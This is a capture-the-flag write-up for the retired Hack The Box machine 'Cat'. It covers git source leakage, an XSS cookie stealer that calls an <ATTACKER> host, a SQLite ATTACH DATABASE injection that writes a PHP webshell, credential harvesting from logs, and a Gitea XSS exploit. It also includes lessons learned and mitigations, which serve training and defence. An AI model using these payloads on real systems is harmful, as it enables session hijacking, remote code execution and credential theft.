---
machine: Cat
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, git, xss, sqli, sqlite, gitea, privesc]
---

# Cat — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

An exposed `.git` leaks Cat's source. XSS in the username steals the admin cookie and the cat-approval parameter is injectable in SQLite; `ATTACH DATABASE` writes a PHP webshell. `rosa`'s hash cracks, `axel`'s password appears in the Apache log, and a Gitea XSS (CVE-2024-6886) exfiltrates the root password.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH and `80` Apache with PHP.
- `feroxbuster` finds `join.php`, `contest.php`, `admin.php`, `winners.php` and `.git/`.
- The session cookie lacks `HttpOnly`.

## Enumeration

- `git-dumper http://cat.htb/.git src` rebuilds the repository.
- The source confirms the username is reflected in the admin review and cat approval concatenates the ID into SQLite.
- It also reveals `/databases/cat.db`.

```bash
git-dumper http://cat.htb/.git cat-src
```

## Foothold

Register a user with XSS in the username and submit a cat; when the admin reviews the entry, the script steals their cookie. That session opens `admin.php` and the approval parameter, vulnerable to SQLi.

```text
<script>new Image().src='http://<ATTACKER>/?c='+document.cookie</script>
```

SQLite allows `ATTACH DATABASE` to create a `.php` file with a table containing the webshell.

```sql
1; ATTACH DATABASE '/var/www/<FILE>.php' AS db;
CREATE TABLE db.pwn (cmd text);
INSERT INTO db.pwn VALUES ('<?php system($_GET[0]); ?>');-- -
```

## Lateral movement

The webshell runs as `www-data`. `cat.db` holds `rosa`'s MD5 hash, which cracks and works with `su`. The Apache log stores `axel`'s password in clear text on login.

```bash
sqlite3 /databases/cat.db 'select * from users;'
grep 'loginPassword' /var/log/apache2/access.log
```

## Privilege escalation

`axel` can access the private Gitea instance on `localhost:3000`. The version is vulnerable to CVE-2024-6886: stored XSS in a repository description runs in the admin session and reads `index.php`, which contains the admin password; the same password is reused for `root` with `su`.

```text
http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php
```

## Evidence

- Exposed `.git` and source code.
- Username XSS and admin cookie.
- SQLite SQLi with `ATTACH DATABASE` and webshell.
- `rosa` hash and `axel` password in the log.
- Gitea CVE-2024-6886 and root password.

## Lessons learned

- An accessible `.git` publishes the code and its internal paths.
- XSS in a field reviewed by an admin executes in their session.
- SQLite can write files from an injection when the database user has permissions.
- Access logs may contain credentials in the URL.

## Mitigation and detection

- Block `.git`, backups and database files from the webroot.
- Escape output and use `HttpOnly`/`SameSite` cookies.
- Parameterize queries and disallow `ATTACH DATABASE` from the application.
- Update Gitea and never log passwords.

## References

- [0xdf — Cat](https://0xdf.gitlab.io/2025/07/05/htb-cat.html)
- [IppSec — Cat](https://www.youtube.com/watch?v=x3UvO2DDbbA)
- [Hack The Box — Cat](https://app.hackthebox.com/machines/cat)
